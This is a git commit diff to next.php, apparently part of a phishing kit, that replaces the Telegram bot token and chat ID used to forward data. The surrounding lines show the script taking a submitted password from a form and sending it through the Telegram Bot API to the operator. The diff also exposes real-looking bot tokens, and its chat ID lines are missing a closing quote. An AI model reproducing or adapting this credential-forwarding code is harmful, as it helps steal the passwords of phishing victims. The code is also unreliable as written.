0384981173a7afff69df8a4c1bd0ea476265724e
packetcodeofficiai <109543514+packetcodeofficiai@users.noreply.github.com>
2026-05-07 15:21:03 +0100

    Update Telegram bot token and chat ID

--- next.php
+++ next.php
@@ -19,8 +19,8 @@ $password = trim($_POST['password']);
     $message .= "|----------- Sent via Telegram Bot --------------|\n";
     
     // Telegram bot configuration
-    $botToken = '6492371388:AAGsuMJ9UnyurOD1eK6OS5wg1cG3GIRYDdc'; // Replace with your bot token
-    $chatId = '813937357; // Replace with your chat ID
+    $botToken = '7189320872:AAF9N7cF8HfkGFvrcaePdfWK4ckIDOKaE-E'; // Replace with your bot token
+    $chatId = '1772532307; // Replace with your chat ID
     
     // Send message via Telegram bot
     $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
